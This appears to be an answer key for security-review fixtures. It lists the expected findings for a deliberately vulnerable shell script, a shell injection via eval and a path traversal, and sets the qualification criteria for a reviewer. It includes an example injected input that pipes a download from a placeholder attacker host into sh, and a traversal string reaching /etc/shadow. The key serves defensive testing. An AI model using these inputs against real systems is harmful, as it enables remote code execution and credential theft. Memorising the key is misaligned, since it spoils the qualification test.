# Expected findings for the security-review fixtures

What a security reviewer must produce for `vulnerable.sh` and `clean.sh` to be
qualified for the `/ship` gate's step 7. Both planted defects are Critical: each
one is reachable from the single argument the script is called with, and each
one gives the caller something the script never meant to give.

A reviewer qualifies when it reports both of these at Important or Critical, and
reports no Important or Critical finding against `clean.sh`. Wording is its own;
the file, the line, the attacker, the input and the gain are what must match.

## vulnerable.sh

1. **Shell injection in `fetch_archive`**, `vulnerable.sh:17`.
   - Who: anyone who controls the script's first argument.
   - What they reach first: nothing. The argument is the only input.
   - Input: an archive name containing shell syntax, for example
     `x.tar.gz; curl attacker.example/s | sh`.
   - Gain: arbitrary commands run as whoever runs the script. `eval` hands the
     composed string to a shell, and `$name` is neither quoted nor checked.
   - The fix in `clean.sh`: `valid_name` rejects every character that is not
     alphanumeric, dot, underscore or hyphen, and `tar` is given the path as one
     argument instead of through `eval`.

2. **Path traversal in `show_archive_note`**, `vulnerable.sh:24`.
   - Who: the same caller.
   - What they reach first: nothing.
   - Input: a name of `../../../../etc/shadow/..`, or any name walking out of
     `$archive_root`.
   - Gain: the contents of a file outside the archive root are printed. The name
     is joined to the root with no check that the result stays under it.
   - The fix in `clean.sh`: `valid_name` rejects `..`, any leading dot, and the
     slash, so no name can leave the root.

## clean.sh

No Important or Critical finding. A reviewer may note in passing that
`valid_name` is duplicated in both functions, or that `/tmp/unpack` is a fixed
path; neither is Important, and neither is a reason to fail qualification.
